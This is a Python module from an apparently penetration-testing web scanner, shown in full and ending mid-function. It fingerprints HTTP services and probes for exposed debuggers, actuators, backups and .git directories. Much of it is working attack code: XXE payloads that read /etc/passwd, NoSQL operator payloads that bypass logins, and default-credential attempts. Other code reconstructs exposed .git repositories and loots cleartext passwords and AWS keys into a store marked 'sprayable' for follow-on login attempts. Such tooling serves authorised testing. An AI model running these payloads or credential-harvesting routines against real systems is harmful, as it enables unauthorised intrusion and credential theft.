"""Web-facing service enumeration + deep checks (stdlib only).

Identifies every HTTP/HTTPS endpoint recce found - on ANY port, not just 80/443 -
fingerprints its tech stack, and runs a bounded set of high-signal checks: exposed
VCS/config files (.git/.env), server-status / Spring actuator, directory listing,
dangerous HTTP methods, weak cookie flags, and (via probes) the security-header / TLS
analysis. Everything positive becomes a Vuln, so web findings flow into the
Vulnerabilities / Verification / Exploitation sheets like anything else. Heavier
scanning is bridged to the Kali tools (whatweb / nikto / nuclei / gobuster / wpscan /
sslscan). Airgapped, stdlib only.
"""

from __future__ import annotations

import base64
import difflib
import hashlib
import hmac
import http.client
import json
import re
import socket
import ssl
import time
from urllib.parse import quote, urlencode, urljoin, urlparse

from .models import Host, Port, Vuln
from . import probes, proxy

_TIMEOUT = 6.0
_UA = "recce-web/1.0"


def is_web(port: Port) -> bool:
    return port.is_open and probes._is_http(port)


def scheme_for(port: Port) -> str:
    return "https" if probes._is_tls(port) else "http"


def url_for(ip: str, port: Port) -> str:
    sch = scheme_for(port)
    if (sch == "http" and port.portid == 80) or (sch == "https" and port.portid == 443):
        return f"{sch}://{ip}"
    return f"{sch}://{ip}:{port.portid}"


def _mk(ip: str, port: Port, sid: str, sev: str, title: str, cwes, output: str,
        remediation: str, confidence: str = "confirmed") -> Vuln:
    return Vuln(ip=ip, port=port.portid, protocol=port.protocol, script_id=sid,
                state="finding", title=title, output=output, severity=sev,
                cwes=list(cwes), source="web", remediation=remediation,
                confidence=confidence)


def _fetch(ip: str, port: Port, path: str = "/", method: str = "GET", read: int = 16384,
           auth: dict | None = None, body: str | None = None):
    """One request. Returns (status, headers_lower, body_text) or None on failure.
    `auth` supplies extra request headers (Cookie / Authorization / custom) so the
    scan can run as an authenticated user; `body` sends a request body (POST)."""
    use_tls = probes._is_tls(port)
    conn = None
    try:
        if use_tls:
            conn = http.client.HTTPSConnection(
                ip, port.portid, timeout=proxy.scaled(_TIMEOUT), context=ssl._create_unverified_context())
        else:
            conn = http.client.HTTPConnection(ip, port.portid, timeout=proxy.scaled(_TIMEOUT))
        req_headers = {"User-Agent": _UA, "Connection": "close", "Accept": "*/*"}
        if auth:
            req_headers.update(auth)
        if body is not None:
            req_headers.setdefault("Content-Type", "application/json")
        conn.request(method, path, body=body, headers=req_headers)
        resp = conn.getresponse()
        # Collapse duplicate headers (last wins) EXCEPT Set-Cookie, whose repeats are
        # each a distinct cookie - join them with newline so cookie/JWT analysis sees all.
        headers: dict = {}
        for k, v in resp.getheaders():
            lk = k.lower()
            if lk == "set-cookie" and lk in headers:
                headers[lk] += "\n" + v
            else:
                headers[lk] = v
        body = b""
        if method != "HEAD":
            body = resp.read(read)
        return resp.status, headers, body.decode("latin-1", "replace")
    except (OSError, http.client.HTTPException, ssl.SSLError, ValueError):
        return None
    finally:
        if conn is not None:
            try:
                conn.close()
            except OSError:
                pass


def _fetch_raw(ip: str, port: Port, path: str, auth: dict | None = None,
               read: int = 4_000_000):
    """GET a path and return the RAW response bytes on 200 (or None). Used to pull
    binary artifacts (git objects, source maps) that must not be text-decoded."""
    use_tls = probes._is_tls(port)
    conn = None
    try:
        if use_tls:
            conn = http.client.HTTPSConnection(
                ip, port.portid, timeout=proxy.scaled(_TIMEOUT),
                context=ssl._create_unverified_context())
        else:
            conn = http.client.HTTPConnection(ip, port.portid, timeout=proxy.scaled(_TIMEOUT))
        req_headers = {"User-Agent": _UA, "Connection": "close", "Accept": "*/*"}
        if auth:
            req_headers.update(auth)
        conn.request("GET", path, headers=req_headers)
        resp = conn.getresponse()
        if resp.status != 200:
            resp.read(1)
            return None
        return resp.read(read)
    except (OSError, http.client.HTTPException, ssl.SSLError, ValueError):
        return None
    finally:
        if conn is not None:
            try:
                conn.close()
            except OSError:
                pass


# --- fingerprinting -------------------------------------------------------------

_TITLE = re.compile(r"<title[^>]*>(.*?)</title>", re.I | re.S)
_GENERATOR = re.compile(r'<meta[^>]+name=["\']generator["\'][^>]+content=["\']([^"\']+)', re.I)
# body/header signatures -> technology label.
_TECH_BODY = [
    (re.compile(r"wp-content|wp-includes|wordpress", re.I), "WordPress"),
    (re.compile(r"Joomla!|/media/jui/", re.I), "Joomla"),
    (re.compile(r"Drupal.settings|/sites/default/", re.I), "Drupal"),
    (re.compile(r"csrf-param|content=\"Ruby on Rails", re.I), "Ruby on Rails"),
    (re.compile(r"__VIEWSTATE", re.I), "ASP.NET WebForms"),
    (re.compile(r"jenkins|X-Jenkins", re.I), "Jenkins"),
    (re.compile(r"grafana", re.I), "Grafana"),
    (re.compile(r"phpMyAdmin", re.I), "phpMyAdmin"),
    (re.compile(r"kc-context|/realms/|Keycloak", re.I), "Keycloak"),
    (re.compile(r'"cluster_name"|lucene_version|You Know, for Search', re.I), "Elasticsearch"),
    (re.compile(r"kbn-name|kbnConfig|Kibana", re.I), "Kibana"),
    (re.compile(r"MinIO Console|minio-", re.I), "MinIO"),
    (re.compile(r"RabbitMQ Management|rabbitmqadmin", re.I), "RabbitMQ"),
    (re.compile(r"Vault v[0-9]|x-vault-|api_addr", re.I), "HashiCorp Vault"),
]
_COOKIE_TECH = {"phpsessid": "PHP", "jsessionid": "Java/Servlet", "asp.net_sessionid": "ASP.NET",
                "laravel_session": "Laravel", "ci_session": "CodeIgniter", "django": "Django"}


def fingerprint(headers: dict, body: str) -> dict:
    tech: list[str] = []
    for h in ("server", "x-powered-by", "x-generator", "x-aspnet-version", "x-drupal-cache"):
        if headers.get(h):
            tech.append(f"{h}={headers[h]}")
    cookie = (headers.get("set-cookie") or "").lower()
    for name, label in _COOKIE_TECH.items():
        if name in cookie:
            tech.append(label)
    for rx, label in _TECH_BODY:
        if rx.search(body):
            tech.append(label)
    m = _GENERATOR.search(body)
    if m:
        tech.append(f"generator={m.group(1).strip()}")
    title = ""
    tm = _TITLE.search(body)
    if tm:
        title = re.sub(r"\s+", " ", tm.group(1)).strip()[:80]
    # dedupe, order-stable
    seen: set[str] = set()
    tech = [t for t in tech if not (t in seen or seen.add(t))]
    return {"tech": tech, "title": title}


def product_version(headers: dict, body: str) -> tuple[str, str]:
    """Best-effort (product, version) for CVE mapping, from headers/body. Used to
    enrich a port's product when nmap left it blank."""
    if headers.get("x-jenkins"):
        return "Jenkins", headers["x-jenkins"]
    if headers.get("x-confluence-request-time") or "Atlassian Confluence" in body:
        m = re.search(r"Confluence[^0-9]*([\d.]+)", body)
        return "Atlassian Confluence", (m.group(1) if m else "")
    if "gitlab" in (headers.get("x-gitlab-meta", "") + body[:2000]).lower():
        return "GitLab", ""
    # Elasticsearch root JSON: {"version":{"number":"7.10.2", ...}, "tagline":"You Know…"}
    if '"cluster_name"' in body or "You Know, for Search" in body:
        m = re.search(r'"number"\s*:\s*"([\d.]+)"', body)
        return "Elasticsearch", (m.group(1) if m else "")
    if headers.get("x-vault-version"):
        return "HashiCorp Vault", headers["x-vault-version"]
    m = _GENERATOR.search(body)
    if m:
        g = re.match(r"([A-Za-z][A-Za-z ]+?)\s*([\d][\d.]*)?\s*$", m.group(1).strip())
        if g:
            return g.group(1).strip(), (g.group(2) or "")
    m = re.search(r"([A-Za-z][\w.-]+)/([\d][\d.]+)", headers.get("server", ""))
    if m:
        return m.group(1), m.group(2)
    return "", ""


# --- secret extraction (redacted) ----------------------------------------------

_SECRET_RE = re.compile(
    r'([A-Za-z0-9_.\-]*(?:pass(?:word)?|secret|token|api[_-]?key|access[_-]?key|'
    r'private[_-]?key|db[_-]?pass|aws[_-]?\w+|client[_-]?secret)[A-Za-z0-9_.\-]*)'
    # flat  key=val / key: val   OR   Spring actuator nested  key:{"value":"val"}
    r'["\']?\s*[:=]\s*(?:\{?\s*["\']?value["\']?\s*:\s*)?["\']?([^\s"\',}{]{4,})', re.I)


def _looks_like_html(body: str) -> bool:
    """True when the body is an HTML document (a SPA/soft-404 index page), as opposed
    to a dotenv/config/source file. Used to reject a backup 'leak' that is really the
    app's index page. Deliberately does NOT treat raw '<?php' source as HTML."""
    head = body[:512].lstrip().lower()
    return (head.startswith("<!doctype html") or head.startswith("<html")
            or "<head" in head or "<body" in head)


def _leaked_secrets(body: str, limit: int = 8) -> list[str]:
    """Redacted 'key=ab…yz' pairs pulled from an exposed config/env body, so the
    finding shows WHAT leaked without dumping the raw secret."""
    out: list[str] = []
    for m in _SECRET_RE.finditer(body):
        key, val = m.group(1), m.group(2)
        red = f"{val[:2]}…{val[-2:]}" if len(val) > 6 else "…"
        pair = f"{key}={red}"
        if pair not in out:
            out.append(pair)
        if len(out) >= limit:
            break
    return out


# --- plaintext credential loot from exposed config/secret files ----------------
# Unlike a DB hash, these are cleartext and directly sprayable, so we lift them into
# the credential store (via the profile) to feed the spray chain. Read-only: the file
# was already fetched for the finding; we just parse what leaked.
_URL_CRED_RE = re.compile(r"://([^:/@\s]+):([^@/\s]+)@")          # scheme://user:pass@host
_ENV_USER_RE = re.compile(r"(?im)^\s*(?:export\s+)?(?:DB_USER(?:NAME)?|DATABASE_USER|"
                          r"MYSQL_USER|POSTGRES_USER|PG_USER|REDIS_USER|"
                          r"ADMIN_USER)\s*[:=]\s*[\"']?([^\s\"']+)")
_ENV_PASS_RE = re.compile(r"(?im)^\s*(?:export\s+)?(?:DB_PASS(?:WORD)?|DATABASE_PASSWORD|"
                          r"MYSQL_PASSWORD|POSTGRES_PASSWORD|PG_PASSWORD|REDIS_PASSWORD|"
                          r"ADMIN_PASS(?:WORD)?)\s*[:=]\s*[\"']?([^\s\"']+)")


def _web_credentials(sid: str, body: str, ip: str, port: int):
    """Extract cleartext, sprayable credentials from an exposed secret-bearing file.
    Returns a list of Credential objects (empty when nothing usable leaked)."""
    from .models import Credential
    out: list = []
    seen: set = set()

    def _add(user: str, secret: str, kind: str, note: str) -> None:
        user, secret = (user or "").strip(), (secret or "").strip()
        if not secret or secret in ("null", "changeme", "your_password_here"):
            return
        k = (user.lower(), secret)
        if k in seen:
            return
        seen.add(k)
        out.append(Credential(username=user, secret=secret, kind=kind,
                              source="web-loot", origin_ip=ip, notes=note))

    if sid == "web-gitconfig":
        # remote URL of the form https://user:token@host/repo.git
        for u, pw in _URL_CRED_RE.findall(body):
            _add(u, pw, "password",
                 f"embedded in .git/config remote URL on {ip}:{port} (sprayable)")
    elif sid == "web-dotenv":
        users = _ENV_USER_RE.findall(body)
        passes = _ENV_PASS_RE.findall(body)
        user = users[0] if users else ""
        for pw in passes:
            _add(user, pw, "password", f"leaked in exposed .env on {ip}:{port}")
    elif sid == "web-aws":
        akid = re.search(r"(?im)^\s*aws_access_key_id\s*=\s*(\S+)", body)
        secret = re.search(r"(?im)^\s*aws_secret_access_key\s*=\s*(\S+)", body)
        if akid and secret:
            _add(akid.group(1), secret.group(1), "password",
                 f"AWS key pair leaked in .aws/credentials on {ip}:{port}")
    return out


# Framework debug pages / consoles: an exposed debugger is RCE or a full-config leak.
_DEBUG_MARKERS = [
    ("web-werkzeug-debug", "critical",
     "Werkzeug/Flask interactive debugger exposed (RCE)", ["CWE-489", "CWE-94"],
     re.compile(r"Werkzeug Debugger|__debugger__|werkzeug\.debug|"
                r"The debugger caught an exception|Interactive Console"),
     "Set debug=False in production; the Werkzeug console is remote code execution."),
    ("web-django-debug", "high",
     "Django DEBUG=True (settings / SECRET_KEY disclosure)", ["CWE-489", "CWE-215"],
     re.compile(r"You're seeing this error because you have|DisallowedHost at|"
                r"Django Version:|using the URLconf defined in"),
     "Set DEBUG=False in production; the debug page leaks SECRET_KEY, settings and env."),
    ("web-rails-debug", "high",
     "Rails debug exception page (source / env disclosure)", ["CWE-489", "CWE-215"],
     re.compile(r"Action Controller: Exception caught|Rails\.root:|"
                r"<title>Action Controller"),
     "Set config.consider_all_requests_local=false in production."),
    ("web-whoops-debug", "high",
     "PHP Whoops debug page (source / env disclosure)", ["CWE-489", "CWE-215"],
     re.compile(r"Whoops\\|whoops-container|Whoops, looks like something went wrong"),
     "Disable the Whoops/debug handler in production."),
]


def _scan_debug(ip: str, port: Port, base: str, auth) -> list[Vuln]:
    """Detect exposed framework debuggers / debug pages — an interactive debugger is
    RCE, a debug error page leaks source/secrets. Self-gating (a handful of requests)."""
    out: list[Vuln] = []
    seen: set = set()
    # 1) Error/debug page fingerprint: a 404 page + a best-effort 500 trigger.
    blob = ""
    for path in (f"/recce{int(_CMDI_A)}-nope", "/%c0%ae%c0%ae", "/?recce[]=1&x[y]=1"):
        r = _fetch(ip, port, path, auth=auth)
        if r:
            blob += r[2][:20000]
    for sid, sev, title, cwes, rx, fix in _DEBUG_MARKERS:
        if sid not in seen and rx.search(blob):
            seen.add(sid)
            out.append(_mk(ip, port, sid, sev, title, cwes,
                           f"An error/debug page on {base} matched the "
                           f"{title.split('(')[0].strip()} signature (debug mode is on).",
                           fix, confidence="confirmed"))
    # 2) Laravel Ignition (CVE-2021-3129 unauth RCE surface).
    ig = _fetch(ip, port, "/_ignition/health-check", auth=auth)
    if ig and ig[0] == 200 and ("can_execute" in ig[2] or "ignition" in ig[2].lower()):
        out.append(_mk(ip, port, "web-ignition", "critical",
                       "Laravel Ignition debug endpoint exposed (CVE-2021-3129 RCE)",
                       ["CWE-94", "CWE-489"],
                       f"GET {base}/_ignition/health-check answered — Ignition is enabled; "
                       "on Laravel < 8.4.2 with debug on this is unauthenticated RCE "
                       "(CVE-2021-3129, log-poisoning via execute-solution).",
                       "Set APP_DEBUG=false; upgrade Laravel/Ignition; remove the debug "
                       "package in production.", confidence="confirmed"))
    # 3) Symfony web profiler (full request/config/DB-query disclosure).
    sp = _fetch(ip, port, "/_profiler", auth=auth)
    if sp and sp[0] == 200 and ("symfony profiler" in sp[2].lower() or "sf-toolbar" in sp[2]):
        out.append(_mk(ip, port, "web-symfony-profiler", "high",
                       "Symfony web profiler exposed (request/config/secret disclosure)",
                       ["CWE-489", "CWE-215"],
                       f"GET {base}/_profiler returned the Symfony profiler — it exposes "
                       "every request, the configuration, DB queries and secrets.",
                       "Restrict the profiler to dev; never ship web-profiler-bundle to "
                       "production.", confidence="confirmed"))
    return out


# XXE: POST an external-entity XML body to likely XML endpoints; a hit returns the
# file content, which only appears if the parser resolved the entity (zero-FP).
_XXE_LINUX = ('<?xml version="1.0"?>\n'
              '<!DOCTYPE recce [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>\n'
              '<recce>&xxe;</recce>')
_XXE_WIN = ('<?xml version="1.0"?>\n'
            '<!DOCTYPE recce [<!ENTITY xxe SYSTEM "file:///c:/windows/win.ini">]>\n'
            '<recce>&xxe;</recce>')
_XXE_HIT = re.compile(r"root:.*:0:0:|\[fonts\]|for 16-bit app support|\[extensions\]")
_XXE_PATHS = ["/", "/api", "/api/xml", "/xmlrpc.php", "/services", "/soap", "/ws",
              "/rest", "/upload", "/import"]


def _scan_xxe(ip: str, port: Port, base: str, auth) -> list[Vuln]:
    """XML External Entity file read. POSTs an external-entity XML body to likely XML
    endpoints; flags only when the referenced file's content comes back (zero-FP)."""
    probes = [(p, _XXE_LINUX) for p in _XXE_PATHS]
    probes += [("/", _XXE_WIN), ("/api", _XXE_WIN)]        # Windows variant, root + /api
    for path, payload in probes:
        extra = dict(auth or {})
        extra["Content-Type"] = "application/xml"
        r = _fetch(ip, port, path, method="POST", body=payload, auth=extra)
        if r and r[2] and _XXE_HIT.search(r[2]):
            what = "/etc/passwd" if "root:" in r[2] else "C:\\windows\\win.ini"
            return [_mk(ip, port, "web-xxe", "critical",
                        f"XML External Entity (XXE) file read via {path}", ["CWE-611"],
                        f"POST {base}{path} with an external-entity XML body returned "
                        f"{what} content - the XML parser resolves external entities "
                        "(arbitrary file read; also an SSRF + billion-laughs DoS surface).",
                        "Disable DTDs / external entities in the XML parser "
                        "(FEATURE_SECURE_PROCESSING, disallow-doctype-decl).",
                        confidence="confirmed")]
    return []


def _find_login_form(ip: str, port: Port, body: str, auth):
    """Locate a login form (root page or a common login path). Returns (form, action)."""
    for cand_body, cand_path in [(body, "/")] + [(None, p) for p in _LOGIN_PATHS]:
        html = cand_body
        if html is None:
            r = _fetch(ip, port, cand_path, auth=auth)
            if not r or r[0] != 200:
                continue
            html = r[2]
        if "password" not in html.lower():
            continue
        f = _parse_form(html, cand_path)
        if f.get("password"):
            f["values"] = _form_values(html)
            action = f.get("action") or cand_path
            return f, (action if action.startswith("/") else "/" + action.lstrip("./"))
    return None, None


def _scan_nosql(ip: str, port: Port, base: str, body: str, auth) -> list[Vuln]:
    """NoSQL (MongoDB-style) authentication bypass: submit operator payloads to the
    login form and confirm a login the wrong-credential baseline didn't get. A few
    login POSTs, lockout-aware; self-skips when there's no login form."""
    form, action = _find_login_form(ip, port, body, auth)
    if not form:
        return []
    userf, passf = _login_fields(form)
    if not userf or not passf:
        return []
    hidden = form.get("values") or {}

    def _urlenc(data):
        return _fetch(ip, port, action, method="POST", body=urlencode(data),
                      auth={"Content-Type": "application/x-www-form-urlencoded"})

    def _win(r):
        return bool(r) and (r[0] in (301, 302, 303) or not _looks_logged_out(r))

    bad = _urlenc({**hidden, userf: "recce_zz_u", passf: "recce_zz_p"})
    if not _looks_logged_out(bad):        # can't tell a login apart -> don't guess (FP guard)
        return []

    def mk(kind, detail):
        return [_mk(ip, port, "web-nosqli", "critical",
                    f"NoSQL injection authentication bypass ({kind})", ["CWE-943", "CWE-287"],
                    detail, "Cast auth inputs to strings; reject operator objects; validate "
                    "types server-side (schema/whitelist).", confidence="confirmed")]

    # 1) bracket/array operator (Express/PHP query-string parsers -> object).
    for op, val in (("$ne", "recce"), ("$gt", "")):
        r = _urlenc({**hidden, f"{userf}[{op}]": val, f"{passf}[{op}]": val})
        if _win(r):
            return mk("operator injection",
                      f"POST {base}{action} with {userf}[{op}]={val!r} & {passf}[{op}]="
                      f"{val!r} logged in with no valid credentials - bracket-parsed input "
                      "reaches a NoSQL query operator.")
    # 2) JSON operator body.
    r = _fetch(ip, port, action, method="POST",
               body=json.dumps({**hidden, userf: {"$ne": None}, passf: {"$ne": None}}),
               auth={"Content-Type": "application/json"})
    if _win(r):
        return mk("JSON operator injection",
                  f"POST {base}{action} with a JSON body {{{userf}:{{$ne:null}}, "
                  f"{passf}:{{$ne:null}}}} logged in with no valid credentials.")
    return []


def _scan_git_dump(ip: str, port: Port, auth: dict | None, findings: list) -> list:
    """Reconstruct an exposed .git over HTTP: recover the tracked source tree, mine the
    recovered files for secrets/credentials, and emit a web-git-dump finding. Returns the
    captured Credential objects (folded into the profile's credential loot)."""
    from . import gitdump
    from .models import Credential

    def _gf(rel: str):
        if rel.endswith("/"):
            return None                               # dir listing not needed
        return _fetch_raw(ip, port, "/" + rel, auth)

    try:
        gd = gitdump.reconstruct(_gf)
    except Exception:      # noqa: BLE001 - reconstruction must never break the sweep
        return []
    if not gd.get("is_git") or not (gd.get("tracked") or gd.get("recovered")):
        return []
    creds: list = []
    for c in gd.get("creds", []):
        secret = c.get("secret", "")
        if not secret or secret == "(aws-access-key-id)":
            continue
        creds.append(Credential(
            username=c.get("username", ""), secret=secret, kind="password",
            source="web-git-loot", origin_ip=ip,
            notes=f"recovered from .git {c.get('path', '')} on {ip}:{port.portid} (sprayable)"))
    tracked = gd.get("tracked", [])
    rec = gd.get("recovered", [])
    detail = (f"Reconstructed the exposed .git: {len(tracked)} tracked file(s); "
              f"recovered {len(rec)} blob(s) ({gd.get('bytes_recovered', 0)} bytes) "
              "including " + ", ".join(r["path"] for r in rec[:6])
              + (" …" if len(rec) > 6 else "") + ".")
    if gd.get("secrets"):
        detail += "\n\nSecrets in recovered source: " + "; ".join(gd["secrets"][:8])
    if creds:
        detail += (f"\n\nCAPTURED {len(creds)} credential(s) -> credential store "
                   "(sprayable): " + ", ".join(c.label for c in creds[:6]))
    if gd.get("packed"):
        detail += ("\n\nPackfiles present - run `git-dumper`/`GitTools` to resolve "
                   "delta-compressed objects for the full history.")
    findings.append(_mk(
        ip, port, "web-git-dump", "high",
        "Exposed .git reconstructed - source tree + secrets recovered",
        ["CWE-538", "CWE-540"], detail,
        "Remove .git from the web root (deny /.git), rotate every leaked secret, and "
        "invalidate the exposed tokens."))
    return creds


# --- Spring Boot Actuator deep-dive --------------------------------------------
# Only probed when the base /actuator responds, so it costs nothing elsewhere.
_ACTUATOR_SUB = [
    ("actuator/env", "high", "web-actuator-env", "Actuator /env exposed (config + secrets)", True),
    ("actuator/configprops", "high", "web-actuator-configprops",
     "Actuator /configprops exposed (config + secrets)", True),
    ("actuator/heapdump", "high", "web-actuator-heapdump",
     "Actuator heapdump downloadable (full memory - secrets/tokens)", False),
    ("actuator/mappings", "medium", "web-actuator-mappings", "Actuator /mappings exposed (route map)", False),
    ("actuator/threaddump", "medium", "web-actuator-threaddump", "Actuator /threaddump exposed", False),
    ("actuator/gateway/routes", "high", "web-actuator-gateway",
     "Spring Cloud Gateway actuator exposed (SpEL RCE surface, CVE-2022-22947)", False),
]


def _scan_actuator(ip: str, port: Port, base_url: str, auth) -> list[Vuln]:
    root = _fetch(ip, port, "/actuator", auth=auth)
    if not (root and root[0] == 200 and ('"_links"' in root[2] or '"health"' in root[2])):
        return []
    out = [_mk(ip, port, "web-actuator", "high", "Spring Boot Actuator exposed (/actuator)",
               ["CWE-200"], f"GET {base_url}/actuator -> HTTP 200 (actuator index).",
               "Secure/limit the actuator endpoints (management.endpoints.web.exposure).")]
    for path, sev, sid, title, extract in _ACTUATOR_SUB:
        r = _fetch(ip, port, "/" + path, auth=auth)
        if not r or r[0] != 200:
            continue
        st, hd, bd = r
        if "heapdump" in path:
            ct = hd.get("content-type", "")
            if "octet-stream" not in ct and "HPROF" not in bd[:16] and "JAVA PROFILE" not in bd[:32]:
                continue
        detail = f"GET {base_url}/{path} -> HTTP {st}."
        if extract:
            secrets = _leaked_secrets(bd)
            if secrets:
                detail += "  leaked: " + "; ".join(secrets)
        out.append(_mk(ip, port, sid, sev, title, ["CWE-200"], detail,
                       "Disable or authenticate the actuator endpoints."))
    return out


# --- backup / source-file exposure ---------------------------------------------
_BACKUPS = [
    ("backup.zip", "zip"), ("site.zip", "zip"), ("www.zip", "zip"), ("backup.tar.gz", "gz"),
    ("backup.sql", "sql"), ("db.sql", "sql"), ("database.sql", "sql"), ("dump.sql", "sql"),
    (".env.bak", "secret"), (".env.save", "secret"), ("wp-config.php.bak", "php"),
    ("config.php.bak", "php"), ("web.config.bak", "xml"), ("index.php.bak", "php"),
]


def _confirm_backup(kind: str, body: str) -> bool:
    if kind == "zip":
        return body[:2] == "PK"
    if kind == "gz":
        return body[:2] == "\x1f\x8b"
    if kind == "sql":
        return bool(re.search(r"INSERT INTO|CREATE TABLE|MySQL dump|PostgreSQL database dump", body, re.I))
    # A 200-everything SPA serves index.html for /.env.bak etc.; if that HTML/JS
    # embeds a front-end config secret (apiKey:"..."), _leaked_secrets matched and we
    # reported the app's index page as an exposed backup. Reject bodies that are
    # clearly an HTML document before trusting a leaked-secret match.
    if _looks_like_html(body):
        return False
    if kind == "php":
        return "<?php" in body or bool(_leaked_secrets(body))
    if kind == "xml":
        return "<configuration" in body.lower()
    return bool(_leaked_secrets(body))


def _scan_backups(ip: str, port: Port, base_url: str, auth) -> list[Vuln]:
    out: list[Vuln] = []
    for name, kind in _BACKUPS:
        r = _fetch(ip, port, "/" + name, auth=auth)
        if r and r[0] == 200 and _confirm_backup(kind, r[2]):
            detail = f"GET {base_url}/{name} -> HTTP 200 ({kind})."
            if kind in ("secret", "php"):
                sec = _leaked_secrets(r[2])
                if sec:
                    detail += "  leaked: " + "; ".join(sec)
            out.append(_mk(ip, port, "web-backup", "high",
                           f"Exposed backup/source file: {name}", ["CWE-538"], detail,
                           "Remove backups/source from the web root; deny access."))
    return out


# --- opt-in default-credential probe (bounded, lockout-aware) -------------------
_BASIC_DEFAULTS = [("admin", "admin"), ("admin", "password"), ("tomcat", "tomcat"),
                   ("root", "root"), ("guest", "guest"), ("admin", "")]
_MAX_BASIC_TRIES = 5    # hard cap per endpoint - stays under common lockout thresholds


def _basic_auth_defaults(ip: str, port: Port, base_url: str, paths: list[str]) -> list[Vuln]:
    """Try a TINY documented default list against endpoints that ask for HTTP Basic
    auth. Capped at _MAX_BASIC_TRIES attempts per endpoint - well under lockout thresholds."""
    import base64
    out: list[Vuln] = []
    for path in paths:
        r = _fetch(ip, port, path)
        if not r or r[0] != 401 or "basic" not in r[1].get("www-authenticate", "").lower():
            continue
        for user, pw in _BASIC_DEFAULTS[:_MAX_BASIC_TRIES]:
            token = base64.b64encode(f"{user}:{pw}".encode()).decode()
            a = _fetch(ip, port, path, auth={"Authorization": f"Basic {token}"})
            # Only a 200 proves the credential was accepted. A 301/302 can be a
            # generic redirect (to a login page, or /admin -> /admin/) independent of
            # credential validity, so it is NOT proof - don't claim a confirmed finding.
            if a and a[0] == 200:
                out.append(_mk(ip, port, "web-default-creds", "high",
                               f"Default HTTP Basic credentials: {user}:{pw or '<blank>'}",
                               ["CWE-1392", "CWE-287"],
                               f"{base_url}{path} accepted {user}:{pw or '<blank>'} (HTTP {a[0]}).",
                               "Change the default credentials; restrict the endpoint."))
                break
    return out


# Form / JSON login apps that HTTP-Basic can't reach. Each descriptor names the login
# endpoint, how to serialise the credentials, and a success predicate. The whole probe
# is bounded (one attempt per documented default) and non-destructive - just a login.
# (id, tech-label from fingerprint, path, content-type, body-template, success, creds)
_APP_LOGINS = [
    {"id": "Grafana", "tech": "Grafana", "path": "/login", "ctype": "json",
     "body": '{{"user":"{u}","password":"{p}"}}',
     "ok": lambda s, b, h: s == 200 and ("logged in" in b.lower()
                                         or "grafana_session" in h.get("set-cookie", "")),
     "creds": [("admin", "admin")]},
    {"id": "MinIO", "tech": "MinIO", "path": "/api/v1/login", "ctype": "json",
     "body": '{{"accessKey":"{u}","secretKey":"{p}"}}',
     # Require a real auth artifact, not any Set-Cookie (a CSRF/anon cookie set on a
     # FAILED login) or the mere word "token" (e.g. an error like "invalid token").
     # A successful MinIO console login sets a `token=` session cookie / returns a
     # token value in the JSON body.
     "ok": lambda s, b, h: s in (200, 204) and (
         "token=" in h.get("set-cookie", "").lower()
         or bool(re.search(r'"(sessiontoken|token|sts)"\s*:\s*"[^"]+', b, re.I))),
     "creds": [("minioadmin", "minioadmin")]},
]


def _form_login_defaults(ip: str, port: Port, base_url: str, tech: list[str]) -> list[Vuln]:
    """Try one documented default per fingerprinted form/JSON-login app (Grafana, MinIO).
    Only runs for apps the fingerprint already matched, so it costs nothing otherwise.
    Non-destructive: a single login POST per default, well under any lockout threshold."""
    out: list[Vuln] = []
    tset = {t.lower() for t in tech}
    for app in _APP_LOGINS:
        if app["tech"].lower() not in tset:
            continue
        ctype = ("application/json" if app["ctype"] == "json"
                 else "application/x-www-form-urlencoded")
        for user, pw in app["creds"]:
            r = _fetch(ip, port, app["path"], method="POST",
                       body=app["body"].format(u=user, p=pw),
                       auth={"Content-Type": ctype})
            if not r:
                continue
            try:
                if app["ok"](r[0], r[2], r[1]):
                    out.append(_mk(ip, port, "web-default-creds", "critical",
                                   f"Default {app['id']} credentials accepted: {user}/{pw}",
                                   ["CWE-1392", "CWE-287"],
                                   f"POST {base_url}{app['path']} with {user}/{pw} "
                                   f"authenticated (HTTP {r[0]}).",
                                   "Change the default admin credentials immediately."))
                    break
            except Exception:  # noqa: BLE001 - a odd body never breaks the sweep
                continue
    return out


# --- generic form auto-login (feed harvested creds into an authenticated scan) ---
_VALUE_RE = re.compile(r'value\s*=\s*["\']([^"\']*)["\']', re.I)
_USERFIELD_RE = re.compile(r"user|email|login|account|uid|\bname\b", re.I)
_LOGIN_PATHS = ["/login", "/signin", "/sign-in", "/admin/login", "/user/login",
                "/auth/login", "/account/login", "/users/sign_in", "/wp-login.php"]
_LOGIN_FAIL = re.compile(
    r"invalid|incorrect|failed|wrong|denied|try again|bad credential|unauthor|"
    r"not recogn; ?|does not match", re.I)


def _form_values(html: str) -> dict:
    """name -> value for every input carrying a value (hidden CSRF tokens etc.)."""
    out: dict = {}
    for inp in _INPUT_RE.findall(html):
        nm = _NAME_RE.search(inp)
        vm = _VALUE_RE.search(inp)
        if nm and vm:
            out[nm.group(1)] = vm.group(1)
    return out


def _login_fields(form: dict) -> tuple:
    passf = next((n for n, t in form["fields"] if t == "password"), None)
    userf = next((n for n, t in form["fields"]
                  if t in ("text", "email") and not _SKIP_NAME.search(n)
                  and _USERFIELD_RE.search(n)), None)
    if not userf:
        userf = next((n for n, t in form["fields"]
                      if t in ("text", "email") and not _SKIP_NAME.search(n)), None)
    return userf, passf


def _session_cookie(headers: dict) -> str:
    """Build a Cookie header from a response's Set-Cookie lines (name=value only)."""
    cookies = []
    for line in headers.get("set-cookie", "").split("\n"):
        m = re.match(r"\s*([^=;\s]+)=([^;]+)", line)
        if m:
            cookies.append(f"{m.group(1)}={m.group(2).strip()}")
    return "; ".join(cookies)


def _looks_logged_out(resp) -> bool:
    """A response that still shows the login form / an auth error / a 401-403 means the
    login did NOT succeed."""
    if not resp:
        return True
    if resp[0] in (401, 403):
        return True
    b = resp[2][:6000].lower()
    return bool(_LOGIN_FAIL.search(b)) or 'type="password"' in b or "type=password" in b


def _form_login(ip: str, port: Port, body: str, creds: list, auth=None) -> tuple:
    """Find a login form (root page or a common login path) and try each harvested
    credential. Returns ({Cookie: ...}, (user, pw)) on a successful login, else
    (None, None). One POST per credential (bounded, lockout-aware)."""
    form = page = None
    for cand_body, cand_path in [(body, "/")] + [(None, p) for p in _LOGIN_PATHS]:
        html = cand_body
        if html is None:
            r = _fetch(ip, port, cand_path, auth=auth)
            if not r or r[0] != 200:
                continue
            html = r[2]
        if "password" not in html.lower():
            continue
        f = _parse_form(html, cand_path)
        if f.get("password"):
            f["values"] = _form_values(html)
            form, page = f, cand_path
            break
    if not form:
        return None, None
    userf, passf = _login_fields(form)
    if not userf or not passf:
        return None, None
